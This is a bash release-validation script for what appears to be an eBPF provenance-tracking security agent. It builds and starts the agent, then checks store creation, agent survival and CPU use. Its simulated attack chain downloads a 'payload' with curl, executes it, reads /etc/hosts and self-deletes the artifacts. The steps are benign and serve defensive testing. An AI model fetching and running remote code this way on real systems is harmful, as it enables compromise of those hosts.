#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/../.."
PROJECT_ROOT=$(pwd)
OUTPUT_DIR="$PROJECT_ROOT/build/v2-validation"
mkdir -p "$OUTPUT_DIR"

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

PASS=0
FAIL=0
TOTAL=0
AGENT_PID=""
STORE_DIR=""
STORE_DB_DIR=""
CPU_LIMIT=10

if [[ -n "${SUDO_USER:-}" && "${SUDO_USER}" != "root" ]]; then
    SUDO_HOME="$(getent passwd "${SUDO_USER}" | cut -d: -f6)"
    if [[ -n "${SUDO_HOME:-}" && -d "${SUDO_HOME}" ]]; then
        export HOME="$SUDO_HOME"
        export GOPATH="${GOPATH:-$SUDO_HOME/go}"
        export GOMODCACHE="${GOMODCACHE:-$GOPATH/pkg/mod}"
        export GOCACHE="${GOCACHE:-$SUDO_HOME/.cache/go-build}"
        for candidate in \
            "$SUDO_HOME/.local/go/bin" \
            "$SUDO_HOME/.local/go1.25/go/bin"
        do
            if [[ -d "$candidate" ]]; then
                export PATH="$candidate:$PATH"
            fi
        done
    fi
fi

check() {
    TOTAL=$((TOTAL + 1))
    local name="$1"
    local result="$2"
    if [ "$result" = "true" ] || [ "$result" = "0" ] || [ "$result" = "ok" ]; then
        echo -e "  ${GREEN}OK${NC} $name"
        PASS=$((PASS + 1))
    else
        echo -e "  ${RED}FAIL${NC} $name"
        echo "    $3"
        FAIL=$((FAIL + 1))
    fi
}

count_matches() {
    local pattern="$1"
    local file="$2"
    grep -ci -- "$pattern" "$file" 2>/dev/null || true
}

has_matches() {
    local pattern="$1"
    local file="$2"
    local count
    count=$(count_matches "$pattern" "$file")
    if [ "${count:-0}" -gt 0 ]; then
        echo true
    else
        echo false
    fi
}

cleanup() {
    echo ""
    echo "[cleanup] Stopping v2 agent..."
    kill "$AGENT_PID" 2>/dev/null || true
    rm -rf "$STORE_DIR" /tmp/evil_v2.sh /tmp/hosts_tamper_test 2>/dev/null || true
    sleep 1
}
trap cleanup EXIT

echo ""
echo "=== ProvidAPT Full Validation Test ==="
echo ""

echo "[1/6] Building ProvidAPT..."
if [ "${1:-}" != "--skip-build" ]; then
    make build-ebpf
    mkdir -p build/bin
    go build -tags bpf -ldflags "-X github.com/Chaoqun-Guo/ProvidAPT/internal/version.Version=dev -X github.com/Chaoqun-Guo/ProvidAPT/internal/version.Commit=none -X github.com/Chaoqun-Guo/ProvidAPT/internal/version.Date=$(date -u +%Y-%m-%dT%H:%M:%SZ)" -o build/bin/providaptd ./cmd/agent/daemon
    check "release build" "$(test -f build/bin/providaptd && echo true || echo false)" "Binary not found at build/bin/providaptd"
else
    echo "  (skip-build flag set)"
fi

echo ""
echo "[2/6] Verifying system..."
SYSTEM_LOG="$OUTPUT_DIR/system.log"
echo "  Kernel: $(uname -r)" | tee -a "$SYSTEM_LOG"
echo "  CPU:    $(nproc) cores" | tee -a "$SYSTEM_LOG"
echo "  Memory: $(free -h | grep Mem | awk '{print $2}')" | tee -a "$SYSTEM_LOG"

check "kernel version >= 5.11" "$(awk '{print $2}' /proc/version | cut -d- -f1 | awk -F. '{if ($1>5 || ($1==5 && $2>=11)) print "true"}')" "Need kernel >= 5.11 for BPF LSM"
check "BTF availability" "$(test -f /sys/kernel/btf/vmlinux && echo true || echo false)" "BTF not available"
check "root access" "$(test "$(id -u)" -eq 0 && echo true || echo false)" "Must run as root"

echo ""
echo "[3/6] Starting ProvidAPT agent..."
AGENT_LOG="$OUTPUT_DIR/agent.log"
STORE_DIR="/tmp/providapt-store-$$"
STORE_DB_DIR="$STORE_DIR/store"
mkdir -p "$STORE_DIR"

PROVIDAPT_OUTPUT_DIR="$STORE_DIR" \
PROVIDAPT_API_GRPC=":0" \
PROVIDAPT_API_REST=":0" \
PROVIDAPT_SKIP_SANITY_CHECKS="bpf_lsm,providapt_user" \
PROVIDAPT_SKIP_PRIVILEGE_DROP="1" \
./build/bin/providaptd > "$AGENT_LOG" 2>&1 &
AGENT_PID=$!
sleep 2

check "agent started (PID $AGENT_PID)" "$(kill -0 "$AGENT_PID" 2>/dev/null && echo true || echo false)" "Agent failed to start. Check $AGENT_LOG"
BASELINE_CPU=$(ps -p "$AGENT_PID" -o %cpu= 2>/dev/null || echo 0)
echo "  Baseline CPU: ${BASELINE_CPU}%"

echo ""
echo "[4/6] Simulating APT attack chain..."
ATTACK_LOG="$OUTPUT_DIR/attack.log"
echo "  [Phase 1] Downloading malicious payload..." | tee -a "$ATTACK_LOG"
curl -s -o /tmp/evil_v2.sh "http://example.com/payload" 2>/dev/null || {
    echo "#!/bin/bash" > /tmp/evil_v2.sh
    echo 'echo "EVIL_PAYLOAD_EXECUTED"' >> /tmp/evil_v2.sh
}
chmod +x /tmp/evil_v2.sh
sleep 1

echo "  [Phase 2] Executing payload..." | tee -a "$ATTACK_LOG"
/tmp/evil_v2.sh 2>/dev/null || true
sleep 1

echo "  [Phase 3] Tampering with system configuration..." | tee -a "$ATTACK_LOG"
cat /etc/hosts > /dev/null
echo "# TAMPERED BY ATTACKER" >> /tmp/hosts_tamper_test
sleep 1

echo "  [Phase 4] Self-deleting evidence..." | tee -a "$ATTACK_LOG"
rm -f /tmp/evil_v2.sh /tmp/hosts_tamper_test
sleep 1

MAX_CPU=0
for _ in 1 2 3 4 5; do
    CPU=$(ps -p "$AGENT_PID" -o %cpu= 2>/dev/null || echo 0)
    CPU_INT=$(echo "$CPU" | cut -d. -f1)
    [ "$CPU_INT" -gt "$MAX_CPU" ] && MAX_CPU=$CPU_INT
    sleep 1
done
echo "  Peak CPU during attack: ${MAX_CPU}%"

echo ""
echo "[5/6] Validating provenance capture..."
check "RocksDB store created" "$(test -d "$STORE_DB_DIR" && echo true || echo false)" "Store dir $STORE_DB_DIR not found"
check "agent survived attack" "$(kill -0 "$AGENT_PID" 2>/dev/null && echo true || echo false)" "Agent crashed during attack"
NODE_COUNT=$(find "$STORE_DB_DIR" -mindepth 1 -print 2>/dev/null | wc -l | tr -d '[:space:]')
check "data written to store" "$(test "$NODE_COUNT" -gt 0 && echo true || echo false)" "No data in store"
check "CPU peak < ${CPU_LIMIT}%" "$(test "$MAX_CPU" -lt "$CPU_LIMIT" && echo true || echo false)" "CPU peaked at ${MAX_CPU}% (threshold: ${CPU_LIMIT}%)"
check "agent logged operations" "$(has_matches "store" "$AGENT_LOG")" "No storage operations logged"

echo ""
echo "[6/6] Generating validation report..."
REPORT="$OUTPUT_DIR/v2_validation_report.txt"
cat > "$REPORT" << REPORT
ProvidAPT Validation Report
===================================
Date:       $(date -Iseconds)
Kernel:     $(uname -r)
Store:      $STORE_DIR

Results:
  Total checks:  $TOTAL
  Passed:        $PASS
  Failed:        $FAIL

Performance:
  Baseline CPU: ${BASELINE_CPU}%
  Peak CPU:     ${MAX_CPU}%
  CPU limit:    ${CPU_LIMIT}%

Attack Chain:
  Download:    /tmp/evil_v2.sh (curl)
  Execute:     bash /tmp/evil_v2.sh
  Tamper:      /etc/hosts
  Self-delete: rm -f artifacts

Store Stats:
  Node count: $NODE_COUNT
REPORT

echo ""
echo "  Report: $REPORT"
echo "  Passed: $PASS / $TOTAL"
echo "  Failed: $FAIL"
echo "  Peak CPU: ${MAX_CPU}%"
echo ""

if [ "$FAIL" -eq 0 ]; then
    echo -e "  ${GREEN}RELEASE VALIDATION PASSED${NC}"
    echo ""
    exit 0
else
    echo -e "  ${RED}Some checks failed (see $REPORT)${NC}"
    echo ""
    exit 1
fi
